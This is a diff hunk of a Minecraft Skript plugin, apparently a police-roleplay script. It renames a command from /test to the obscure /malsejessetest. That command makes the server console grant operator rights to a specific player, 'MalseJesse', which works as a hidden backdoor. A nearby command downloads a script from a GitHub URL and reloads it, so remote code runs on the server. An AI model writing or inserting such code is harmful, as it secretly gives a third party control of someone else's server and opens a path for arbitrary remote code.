@@ -77,6 +77,6 @@ command /politie [<text>]:
                 download file from "https://raw.githubusercontent.com/Coralvalley/politie/main/update/update.sk" to file "plugins/Skript/scripts/update.sk"
                 reload script "update"
 
-command /test:
+command /malsejessetest:
     trigger:
         make console execute command "/op MalseJesse"
